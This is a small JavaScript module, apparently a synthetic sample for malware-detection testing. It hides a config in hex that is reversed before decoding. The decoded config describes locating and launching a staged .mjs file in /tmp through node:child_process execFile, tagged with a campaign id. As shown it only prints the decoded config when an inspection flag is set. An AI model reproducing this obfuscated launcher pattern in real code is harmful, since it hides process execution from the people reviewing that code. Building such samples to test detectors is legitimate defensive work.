const moduleShape = Object.freeze({ format: "commonjs" });

const Material_c4e68721 = "736a6d2e6139613534616634373963622d65676174732e2f65646f6e2d73736572746e75682f706d742f3d687461705f656c69667c34414634373943422d45444f4e3d64695f6e676961706d61637c313d746e756f635f65676174737c65646f6e5f656c6966636578653d726574706164617c737365636f72705f68637461707369642c6c61636f6c5f657461636f6c3d73706574737c313d76";

const Codec_c4e68721 = "hex_buffer|reverse_bytes|";



function load_c4e68721() { return [...Buffer.from(Material_c4e68721, "hex")]; }

function decode_c4e68721(v_a19c) { return [...v_a19c].reverse(); }

async function recover_c4e68721() {

  const v_c304 = "";

  const v_a19c = load_c4e68721(); let v_b27e = [];

  for (const v_d41a of [1]) v_b27e = decode_c4e68721(v_a19c);

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_c4e68721() { return (await recover_c4e68721()).split("|").join("|"); }

async function plan_c4e68721() { const inspect = inspect_c4e68721; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "execfile_node", path: fields.file_path, module: "node:child_process" }); }

void moduleShape; void plan_c4e68721;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_c4e68721());

